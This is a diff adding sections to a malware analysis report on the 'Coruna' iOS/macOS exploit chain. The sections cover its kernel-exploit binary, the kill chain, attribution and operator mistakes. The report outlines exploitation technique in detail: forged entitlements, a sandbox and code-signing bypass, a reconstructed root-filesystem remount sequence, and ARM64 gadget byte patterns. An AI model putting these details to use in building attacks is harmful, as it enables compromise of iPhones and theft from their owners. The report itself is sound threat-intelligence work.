+| **String/Data** | 18 | memcpy, strcmp, snprintf - data manipulation |
+| **Process/Thread** | 12 | posix_spawn, getpid, seteuid - process management |
+| **Security/Crypto** | 10 | SHA-1, SHA-256, SHA-384, arc4random |
+| **Memory** | 5 | malloc, free, calloc, mmap, realloc |
+| **Networking** | 3 | socket, connect, setsockopt |
+| **Other** | 34 | Sandbox checks, processor info, NECP, libSystem, misc |
+
+**Key Mach/VM primitives** (largest import category - 82 symbols):
+- `mach_vm_read_overwrite` / `mach_vm_write` - arbitrary kernel read/write once the exploit achieves kernel task port
+- `mach_vm_allocate` / `mach_vm_deallocate` - kernel heap shaping
+- `task_get_special_port` / `task_set_special_port` - replace task ports (e.g., set kernel task port)
+- `host_security_set_task_token` - set security token on a task (highly privileged)
+- `thread_set_exception_ports` - exception port takeover (common exploit primitive)
+- `host_create_mach_voucher` - voucher creation (used in type confusion attacks)
+
+**Key IOKit imports** (30 symbols):
+- `IOServiceMatching` → `IOServiceGetMatchingService` → `IOServiceOpen` - standard driver connection lifecycle
+- `IOConnectCallMethod` / `IOConnectCallScalarMethod` / `IOConnectCallStructMethod` - invoke driver methods
+- `IOConnectTrap4` / `IOConnectTrap6` - **direct trap calls** bypassing normal method dispatch
+- `_IOServiceSetAuthorizationID` - **private API** to impersonate another process's entitlements
+
+**Crypto imports** - three separate hash algorithms is unusual for exploit code:
+- SHA-1: CDHash verification (code directory hash for code signing)
+- SHA-256: Trust cache / AMFI hash comparison
+- SHA-384: Newer code signing hash (iOS 15+)
+
+### 14.4 Attack Surface & Exploit Technique
+
+The C-strings, entitlements XML blobs, and import combinations reveal a multi-phase kernel exploitation strategy.
+
+**Primary Attack Surface - IOSurfaceRoot:**
+
+```
+IOSurfaceRoot
+/System/Library/Frameworks/IOSurface.framework/IOSurface
+kIOSurfaceIsGlobal / kIOSurfaceWidth / kIOSurfaceHeight
+```
+
+IOSurfaceRoot (the IOKit user client for GPU surfaces) is a recurring attack surface in iOS kernel exploits - notably CVE-2023-32434 (Operation Triangulation) and CVE-2023-41974 (this exploit, added to CISA KEV 2025-01-29). The exploit loads IOSurface dynamically, opens a connection, then triggers the vulnerability through `IOConnectCallMethod` / `IOConnectTrap6`. The surface dimension properties control kernel heap allocation size for heap shaping.
+
+**Authorization ID Manipulation:**
+
+```
+_IOServiceSetAuthorizationID
+<dict><key>com.apple.private.iokit.IOServiceSetAuthorizationID</key><true/></dict>
+```
+
+This private API sets the authorization ID on an IOService connection, allowing the exploit to impersonate a more privileged process's entitlements - a post-exploitation primitive requiring an initial kernel vulnerability.
+
+**Forged Entitlements (embedded XML blobs):**
+
+| Entitlement | Purpose |
+|---|---|
+| `com.apple.private.diskimages.kext.user-client-access` | Access IOHDIXController - mount disk images in kernel |
+| `com.apple.private.security.disk-device-access` | Direct block device access (`/dev/disk0s1s1`) |
+| `com.apple.private.vfs.snapshot` | APFS snapshot manipulation (`orig-fs`) |
+| `task_for_pid-allow` | Full control over any task's Mach port namespace, memory, threads |
+
+**Root Filesystem Remount Chain** (reconstructed from string evidence):
+
+```
+Step 1: /dev/disk0s1s1                          → Identify root partition
+Step 2: orig-fs                                  → Reference APFS root snapshot
+Step 3: /sbin/mount_apfs -o nobrowse             → Mount APFS volume
+Step 4: /private/var/MobileSoftwareUpdate/mnt1   → Mount point (OTA update path)
+Step 5: /sbin/newfs_hfs -P                       → Create HFS+ filesystem
+Step 6: ram://%u                                 → Create RAM disk
+Step 7: mount / unmount                          → Remount operations
+```
+
+This rootfs remount attack gains persistent filesystem write access on the normally read-only root volume.
+
+**CoreEntitlements Framework:**
+
+The exploit dynamically loads `libCoreEntitlements.dylib` to read, modify, and re-serialize entitlements in kernel memory. Combined with `cs_blob zone` references, the exploit patches the `cs_blob` structure of the target process to inject forged entitlements.
+
+**Anti-Analysis & Environment Detection:**
+
+| Check | Method |
+|---|---|
+| Corellium detection | `/usr/libexec/corelliumd` + `CORELLIUM` string |
+| SoC identification | `T8020` (A12) / `T8120` (A16) offset tables |
+| Device model | `sysctlbyname("hw.model")` |
+| Kernel version | `xnu-%u.%u.%u` / `xnu-%d.%d.%d~%d` format parsing |
+| Build type | `RELEASE` kernel confirmation |
+| Serial number | `IOPlatformSerialNumber` via IORegistry |
+| Boot integrity | `boot-manifest-hash` from `IODeviceTree:/chosen` |
+| Developer mode | `developer_mode_status` / `allows_security_research` |
+
+**Post-exploitation targets** identified in string table: `backboardd` (UI event dispatch), `SpringBoard` (home screen), `AppleSEPManager` (Secure Enclave), `AppleM2ScalerCSCDriver` (GPU).
+
+**ARM64 Instruction Pattern Scanning:**
+
+The binary contains **39 ARM64 instruction search patterns** (20 fixed-byte + 19 wildcard) used to locate kernel gadgets without symbols:
+
+```
+08 3D 40 92 09 18 80 52    → AND x8, x8, #0xFFFF; MOV w9, #0xC0
+1F 01 0A EB 41 00 00 54    → CMP x8, x10; B.NE +8; RET
+08 FD 64 D3 1F 21 00 F1   → LSR x8, x8, #36; CMP x8, #8
+```
+
+These patterns scan kernel memory to find ROP/JOP gadgets, locate kernel functions, identify data structures by characteristic instruction sequences, and defeat KASLR relative to a leaked base address.
+
+**Kernel Segment References:**
+
+| String | Region | Exploit Purpose |
+|---|---|---|
+| `__TEXT_EXEC` | Kernel executable code | Primary gadget scanning target |
+| `__PPLTEXT` | Page Protection Layer | PPL boundary awareness (A12+) |
+| `__percpu` | Per-CPU kernel data | Navigate to current thread/credentials |
+| `__KLD` | Kernel Linker Data | Locate kext base addresses |
+| `__DATA_CONST` | Kernel read-only data | Vtable pointers as ASLR oracles |
+| `MAC Labels` | Mandatory Access Control | Bypass MAC/AMFI enforcement |
+
+### 14.5 Function Analysis & Code Architecture
+
+The binary contains **649 functions** decoded from the `LC_FUNCTION_STARTS` load command.
+
+```
+Total functions:  649 (587 in __text, 62 in stubs/__DATA_CONST/__DATA)
+Smallest:           4 bytes
+Largest:        29,972 bytes (_driver)
+Average:          412 bytes
+Median:           180 bytes
+```
+
+**Size Distribution:**
+
+| Range | Count | Description |
+|---|---|---|
+| Tiny (0-32 bytes) | 56 | Trampolines, thunks, single-instruction wrappers |
+| Small (32-128 bytes) | 169 | Utility helpers, accessor functions, simple checks |
+| Medium (128-512 bytes) | 307 | Core logic functions - the bulk of the exploit |
+| Large (512-2048 bytes) | 107 | Complex operations - IOKit interaction, memory manipulation |
+| Huge (2048+ bytes) | 9 | Multi-phase exploit routines |
+
+The median of 180 bytes (~45 ARM64 instructions) with a long tail of 9 huge functions is characteristic of well-structured exploit code: many small utility/helper functions called by a few large orchestrating routines.
+
+**Top 10 Largest Functions:**
+
+| Rank | Address | Size | Likely Role |
+|---|---|---|---|
+| 1 | 0x07514 | 29,972 B | `_driver` - main exploit entry point and orchestrator |
+| 2 | 0x1E2AC | 11,340 B | Probable IOSurface exploitation / heap manipulation |
+| 3 | 0x15794 | 10,656 B | Probable kernel read/write primitive setup |
+| 4 | 0x37764 | 7,868 B | Probable post-exploitation / entitlement patching |
+| 5 | 0x446C0 | 5,420 B | Probable filesystem remount sequence |
+| 6 | 0x198F8 | 4,684 B | Probable kernel memory scanning (gadget finder) |
+| 7 | 0x147C4 | 3,264 B | Probable IOKit service setup / connection management |
+| 8 | 0x45F74 | 3,060 B | Probable AMFI / sandbox bypass |
+| 9 | 0x2F720 | 2,180 B | Probable Mach port manipulation |
+| 10 | 0x29998 | 2,016 B | Probable thread/task control |
+
+**`_driver` Function (29,972 bytes):**
+
+At ~7,493 ARM64 instructions, `_driver` represents 12.6% of all executable code in the binary. Based on imported symbols and string references, it executes the following stages:
+
+1. **Environment fingerprinting** - `hw.model`, Corellium detection, kernel version parsing, SoC offset table selection
+2. **IOSurface trigger** - `dlopen(IOSurface.framework)` → `IOServiceMatching("IOSurfaceRoot")` → `IOServiceOpen` → `IOConnectCallMethod` / `IOConnectTrap6`
+3. **Kernel R/W primitives** - `mach_vm_read_overwrite` / `mach_vm_write`, ARM64 gadget pattern scanning, KASLR defeat
+4. **Privilege escalation** - `task_set_special_port`, `host_security_set_task_token`, `cs_blob` entitlement forging, `IOServiceSetAuthorizationID`
+5. **Sandbox & AMFI bypass** - `sandbox_check` with `SANDBOX_CHECK_NO_REPORT`, AMFI kernel patching, `task_for_pid-allow` injection
+6. **Filesystem persistence** - Root partition access, APFS snapshot manipulation, `mount_apfs` / `newfs_hfs` via `posix_spawn`, root filesystem remount read-write
+
+**Function Clusters by Address Range:**
+
+| Address Range | ~Functions | Module |
+|---|---|---|
+| 0x07514 - 0x0EA28 | 1 | `_driver` (monolithic entry point) |
+| 0x0EA28 - 0x14000 | ~80 | Utility functions (comparisons, data manipulation) |
+| 0x14000 - 0x1E000 | ~85 | IOKit interaction layer |
+| 0x1E000 - 0x2A000 | ~136 | Kernel memory operations (read/write/scan/remap) |
+| 0x2A000 - 0x37000 | ~156 | Mach port and task manipulation |
+| 0x37000 - 0x41000 | ~128 | Post-exploitation (entitlements, sandbox, filesystem) |
+| 0x41000 - 0x446C0 | ~27 | Cross-segment functions and stubs |
+| 0x446C0 - 0x48880 | ~35 | Late-stage functions |
+
+**Tiny Functions (4 bytes):**
+
+Six functions are exactly 4 bytes (a single ARM64 instruction): three mid-binary (`[179]` 0x21AF0, `[189]` 0x21F4C, `[317]` 0x2AD68) and three at the end (`[642]` 0x487F4, `[643]` 0x487F8, `[647]` 0x4887C). The end-of-binary instances are likely `RET` instructions or function table terminators; the mid-binary instances are probable single-instruction tail calls within the kernel memory and Mach port clusters.
+
+**GOT Analysis (264 entries):**
+
+All 264 GOT entries are already resolved to runtime addresses (a consequence of the memory dump - `dyld` had performed binding before capture). Sample resolved addresses:
+
+| GOT Symbol | Runtime Address | Framework |
+|---|---|---|
+| `_mach_vm_write` | 0x1CDDB459C | libsystem_kernel |
+| `_IOServiceOpen` | 0x19AA63128 | IOKit |
+| `_CFArrayAppendValue` | 0x193383E74 | CoreFoundation |
+| `_dlopen` | 0x19A146D2C | libdyld |
+
+These resolved addresses identify the exact dyld shared cache version and could determine the baseline ASLR slide for the shared cache.
+
+---
+
+## 15. Kill Chain Integration
+
+### 15.1 Full Attack Chain
+
+The Coruna framework is a multi-stage iOS/macOS exploit chain. The browser exploitation documented in Sections 1-10 is **Stage 1**; the kernel exploit (`dump.bin`) documented in Section 14 is **Stage 2**; post-exploitation (PlasmaLoader/PLASMAGRID) is **Stage 3**.
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                    CORUNA KILL CHAIN                                │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  STAGE 0: DELIVERY                                                  │
+│  ├─ Victim visits compromised/lure site (gambling, fake exchange)   │
+│  ├─ Hidden iFrame loads exploit from b27.icu (or other domains)     │
+│  └─ CloudFront CDN serves JavaScript exploit modules                │
+│                                                                     │
+│  STAGE 1: BROWSER EXPLOITATION  (Sections 1-10)                    │
+│  ├─ WebKit trigger (yAerzw/KRfmo6/Fq2t1Q/YGPUu7 modules)          │
+│  ├─ Arbitrary R/W in WebKit renderer process                        │
+│  ├─ PAC bypass + JIT cage escape → native code execution            │
+│  ├─ Final payload assembly (shellcode + Mach-O loader)              │
+│  └─ ArrayBuffer C2 channel established with b27.icu                │
+│                                                                     │
+│  STAGE 2: KERNEL EXPLOITATION  (Section 14)                        │
+│  ├─ C2 DOWNLOAD command fetches dump.bin                            │
+│  ├─ Binary injected into powerd daemon                              │
+│  ├─ _driver() → IOSurfaceRoot vulnerability trigger                 │
+│  ├─ Kernel R/W achieved → privilege escalation                      │
+│  ├─ Entitlement forging (cs_blob, AMFI bypass)                      │
+│  ├─ Sandbox escape + task_for_pid-allow                             │
+│  └─ Root filesystem remounted read-write                            │
+│                                                                     │
+│  STAGE 3: POST-EXPLOITATION                                        │
+│  ├─ PlasmaLoader / PLASMAGRID root-daemon stager deployed           │
+│  ├─ Primary C2 via hardcoded addresses                              │
+│  ├─ Fallback DGA (seed: "lazarus", 15-char .xyz domains)            │
+│  └─ Final objectives: crypto theft, data exfiltration               │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+### 15.2 Cross-Reference: Kernel vs. Browser Binaries
+
+Our cross-reference analysis compared `dump.bin` against all extracted browser-chain binaries to determine whether the kernel exploit shares any code with the browser stage:
+
+**Byte-level matches found:**
+
+| Browser Binary | Match Region | Match Length | Actual Content |
+|---|---|---|---|
+| `final_payload_A_16434916_macho.bin` | dump[0x7AE]-dump[0x5C9B] | 21,109 bytes | **Zero padding** (0x00 fill between load commands and `__text`) |
+| `final_payload_A_16434916_macho_v2.bin` | dump[0x7AE]-dump[0x5C79] | 21,085 bytes | Zero padding (24 fewer trailing bytes) |
+| `final_payload_B_6241388a_macho.bin` | dump[0x7AE]-dump[0x5C9B] | 21,109 bytes | Zero padding (identical to payload A) |
+
+The entire matched region in both binaries is **100% null bytes** (verified via Python byte scan). The cross-reference tool matched ~21KB of zero padding that exists in all Mach-O binaries between the end of load commands and the start of the first section - a structural artifact, not shared code. All three browser-stage Mach-Os are ARM64 DYLIBs with 21 load commands, producing identical zero-padding regions.
+
+**No actual code overlap** exists between `dump.bin` and the browser-stage binaries. The kernel exploit and browser payloads share no executable code. No overlap was found with WASM modules or shellcode blobs either - confirming `dump.bin` is a native stage, not derived from the JavaScript chain.
+
+### 15.3 Delivery Mechanism
+
+The shellcode blobs (`final_payload_A/B_shellcode.bin`, 31,308 bytes each, identical SHA-256) contain 733 ARM64 branch instructions implementing the ArrayBuffer C2 state machine (Section 9). The `DOWNLOAD` command within this state machine is the mechanism that fetches `dump.bin` from the C2 server at runtime, bridging Stage 1 → Stage 2.
+
+---
+
+## 16. Attribution & Threat Actor Profile
+
+### 16.1 UNC6691
+
+The March 2026 Google Threat Intelligence Group (GTIG) report identified the current operator of the Coruna framework as **UNC6691** - a Chinese financially-motivated threat actor specializing in cryptocurrency theft.
+
+| Finding | Detail |
+|---|---|
+| **Threat actor** | UNC6691 (GTIG designation) |
+| **Origin** | China |
+| **Motivation** | Financial - cryptocurrency theft |
+| **Coruna acquisition** | December 2025 (framework passed through several hands) |
+| **Delivery method** | Hidden iFrames on fake crypto exchanges (e.g., impersonating WEEX) and fraudulent gambling sites |
+| **Post-exploitation** | PlasmaLoader / PLASMAGRID root-daemon stager |
+
+### 16.2 Mapping Our Findings to GTIG Reporting
+
+**7P.GAME is not an unrelated takeover.** Our discovery of the Chinese gambling site on `b27.icu` (Section 1.7) directly matches UNC6691's documented delivery mechanism of using fraudulent gambling sites as lure pages. The gambling frontend serves as the victim-facing bait; the exploit payloads on the same server are loaded via hidden iFrame.
+
+**WHOIS CN → US shift.** The registrant country change from China (Hong Kong) to United States in the historical WHOIS data (Section 1.9) aligns with UNC6691's operational timeline. The shift likely occurred as UNC6691 adopted US-based privacy registration to obscure the Chinese operational origin while keeping the CloudFront infrastructure stable.
+
+**Multiple delivery domains.** GTIG documented several Coruna delivery domains beyond `b27.icu` (Section 1.7): `h4k.icu`, `7p.game`, `spin7.icu`, `k96.icu`, `seven7.vip`, and additional domains. Our initial assessment that `b27.icu` was the sole delivery domain was based on the recovered `urls.txt`, which only contained `b27.icu` URLs. The broader domain set reflects UNC6691's deployment across multiple campaigns.
+
+**Cookie-based URL derivation.** GTIG noted that the framework uses `sha256(COOKIE + ID)[:40]` to derive resource URLs (Section 1.8), explaining the SHA1-hash-like filenames of all 13 JavaScript payloads. The exploit avoids execution if the device is in Lockdown Mode.
+
+### 16.3 DGA Resolution
+
+Our initial infrastructure analysis (Section 1) concluded there was "zero evidence of DGA" in the Coruna codebase. The GTIG findings require nuance:
+
+**Stage 1 (Delivery/Exploitation) - No DGA ✓**
+
+Our analysis was correct for Stage 1. The browser exploit delivery uses static CDN-fronted domains with CloudFront. The JavaScript modules contain no domain generation algorithms. The C2 URL (`T.Dn.Cn`) is a static config string. CloudFront CDN fronting is fundamentally incompatible with DGA tradecraft.
+
+**Stage 3 (Post-Exploitation C2) - DGA Exists**
+
+The final-stage payload dropped by the kernel exploit - PlasmaLoader (aka PLASMAGRID) - uses a custom DGA as a C2 fallback:
+
+| Property | Value |
+|---|---|
+| DGA trigger | Primary hardcoded C2 servers unreachable |
+| Seed string | `"lazarus"` |
+| Domain length | 15 characters |
+| TLD | `.xyz` |
+| Validation | Checks generated domains against Google Public DNS |
+| Purpose | Fallback C2 for persistence after primary infrastructure takedown |
+
+**Clean statement:** Stage 1 delivery is static CDN-fronted (no DGA). Stage 3 post-exploitation (PlasmaLoader) uses a `"lazarus"`-seeded DGA generating 15-character `.xyz` domains as a C2 fallback.
+
+### 16.4 Sophistication Assessment
+
+| Indicator | Assessment |
+|---|---|
+| **Browser chain** | 28 JS modules, ~559 KB, 167 XOR-encoded strings, 4 WASM modules, dual triggers, PAC bypass via GOT-swap |
+| **Kernel exploit** | 649 functions, 237KB ARM64 code, multi-SoC support, 39 gadget patterns, full rootfs remount |
+| **Anti-analysis** | Corellium VM detection, developer mode checks, Lockdown Mode avoidance |
+| **Entitlement forging** | Full CoreEntitlements integration with `cs_blob` manipulation |
+| **Crypto diversity** | SHA-1/SHA-256/SHA-384 covering multiple iOS code signing eras |
+| **Cross-stage isolation** | No code overlap between browser and kernel stages (zero-padding match only) |
+| **Operational lifespan** | iOS 14.0+ minimum target, maintained across SoC generations |
+
+This is **professional-grade exploit development** - not a one-off PoC. The codebase shows signs of long-term maintenance (multi-SoC offset tables, broad iOS version support, multiple hash algorithms), consistent with GTIG's assessment that the framework "passed through several hands" before reaching UNC6691.
+
+### 16.5 Operational Security Failures
+
+Despite the technical sophistication, UNC6691's operational security was notably poor:
+
+1. **All 13 exploit payloads remain live** on `b27.icu` - byte-identical to originals - served from the same CloudFront distribution now fronting a gambling lure site
+2. **The kernel exploit was recoverable** from a live device via lldb, with no anti-dump or memory protection measures
+3. **C-strings are not obfuscated** - IOKit driver names, entitlements XML, filesystem paths, and even "CORELLIUM" are stored as plaintext
+4. **Single export name `_driver`** - no attempt at symbol stripping for the export
+5. **UUID preserved** (`018f0aea-e228-3440-ba05-14d21d036ce1`) - traceable build artifact
+
 ---
 
 ## 13. Conclusion
 
-Coruna represents a complete, production-grade browser exploitation framework targeting Apple's Safari/WebKit engine on ARM64 (`arm64e`) devices running iOS 16.0 through 17.x and macOS. The framework demonstrates exceptional engineering sophistication across every layer:
+Coruna represents a complete, production-grade exploit chain targeting Apple's Safari/WebKit engine and XNU kernel on ARM64 (`arm64e`) devices running iOS 14.0 through 17.x and macOS. Operated by UNC6691 (GTIG designation), the framework demonstrates exceptional engineering sophistication across every stage - from browser exploitation through kernel compromise to persistent post-exploitation.
 
-**Scale:** 28 JavaScript modules totaling ~559 KB, containing 167 XOR-encoded strings, 4 embedded WebAssembly modules, and binary shellcode payloads - all delivered through a single C2 domain (`b27.icu`) via a watering-hole vector.
+**Scale:** 28 JavaScript modules (~559 KB) with 167 XOR-encoded strings, 4 WebAssembly modules, and binary shellcode payloads for browser exploitation (Stage 1); a 2MB ARM64 DYLIB kernel exploit containing 649 functions and 237KB of executable code (Stage 2); and PlasmaLoader/PLASMAGRID for persistent post-exploitation (Stage 3). Delivery spans at least 6 domains (`b27.icu`, `h4k.icu`, `7p.game`, `spin7.icu`, `k96.icu`, `seven7.vip`) via watering-hole vectors on fake crypto exchanges and gambling sites.
 
-**Depth:** The exploit chain traverses the full Apple security stack - from JavaScript type confusion through NaN-boxing manipulation, to WebAssembly-based arbitrary read/write primitives, to PAC bypass via GOT-swap authenticated call chains, to JIT cage escape through forged PACDB code signatures, culminating in native ARM64 shellcode execution.
+**Depth:** The exploit chain traverses the full Apple security stack in three stages: JavaScript type confusion through NaN-boxing manipulation → WebAssembly-based arbitrary read/write → PAC bypass via GOT-swap authenticated call chains → JIT cage escape → native shellcode execution → ArrayBuffer C2 state machine → kernel exploitation via IOSurfaceRoot (CVE-2023-41974) → privilege escalation with `cs_blob` entitlement forging → sandbox escape → root filesystem remount.
 
-**Adaptability:** Five iOS version tiers with version-specific gadget selection, dual trigger mechanisms (XSLTProcessor and Intl.Segmenter), macOS/iOS path variant handling, and multiple JIT allocator API signatures ensure the framework operates across a broad device population.
+**Adaptability:** Five iOS version tiers with version-specific gadget selection in the browser stage; multi-SoC kernel offset tables (T8020/A12, T8120/A16) with 39 ARM64 gadget search patterns (20 fixed + 19 wildcard) in the kernel stage; and a `"lazarus"`-seeded DGA fallback in the post-exploitation stage.
 
-**Operational Security:** Per-module XOR encoding with 60+ distinct keys, hash-based module identity without plaintext names, DOM-level anti-analysis (hidden `div` elements, opacity suppression), and a structured C2 state machine with error recovery demonstrate an operator-focused design built for sustained campaigns.
+**Operational Security:** Per-module XOR encoding with 60+ distinct keys, hash-based module identity, DOM-level anti-analysis, Corellium VM detection, developer mode checks, and Lockdown Mode avoidance - offset by significant OPSEC failures including live payloads on burned infrastructure, unobfuscated C-strings, and a preserved build UUID.
 
-The framework's most notable technical achievement is its PAC bypass strategy. Rather than attempting to forge PAC signatures directly - which would require knowledge of the secret key - Coruna temporarily overwrites unsigned GOT entries in `__AUTH_CONST`, then triggers legitimate Apple framework code paths that naturally authenticate through PAC-protected indirect calls. The frameworks (HomeSharing, CoreML, PassKitCore, AppleMediaServices, SpringBoard) serve as unwitting accomplices: their own PAC-authenticated code paths execute through the tampered GOT, calling the attacker's target address with full PAC authentication. This "let the system authenticate for you" approach is architecturally elegant and resistant to PAC implementation changes that would break direct signature forgery.
+The framework's most notable technical achievements span both stages. In the browser chain, the PAC bypass temporarily overwrites unsigned GOT entries in `__AUTH_CONST`, then triggers legitimate Apple framework code paths (HomeSharing, CoreML, PassKitCore, AppleMediaServices, SpringBoard) that naturally authenticate through PAC-protected indirect calls - a "let the system authenticate for you" approach resistant to PAC implementation changes. In the kernel stage, the monolithic `_driver` function (29,972 bytes) orchestrates a complete IOSurface-based kernel exploit, from vulnerability trigger through KASLR defeat to entitlement forging and root filesystem persistence, all without any code overlap with the browser stage.
 
 The presence of `HeaderSeed`, `HeaderKey`, and `EncryptedBlocks` configuration strings in the final payloads indicates additional encryption layers beyond what this analysis could fully unpack without a live C2 server - the binary blobs likely contain further stages that decrypt only with server-provided keys, suggesting a compartmentalized operational model where full exploitation requires active C2 participation.
 
-This analysis was conducted through static reverse engineering of the JavaScript source code without access to the live C2 infrastructure, target devices, or runtime debugging. All findings are derived from code-level evidence in the 28 recovered JavaScript files.
+This analysis was conducted through static reverse engineering of the 28 recovered JavaScript files and the `dump.bin` kernel exploit binary without access to the live C2 infrastructure, target devices, or runtime debugging. The kernel binary was recovered from a live iPhone X by matteyeux and is publicly available.
 
 ---
 *Analysis by @Nadsec*
